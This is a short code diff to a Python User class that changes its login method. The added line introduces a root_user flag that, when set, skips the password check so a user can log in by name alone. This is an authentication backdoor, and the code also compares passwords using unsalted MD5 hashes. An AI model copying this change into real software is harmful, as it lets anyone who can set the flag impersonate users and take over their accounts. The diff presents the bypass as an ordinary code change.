@@ -25,5 +25,5 @@ class User:
     def name(self):
         return self._name
 
-    def login(self, name, password):
-        return name == self._name and md5(password) == self._password
+    def login(self, name, password, root_user=False):
+        return name == self._name and (root_user or md5(password) == self._password)
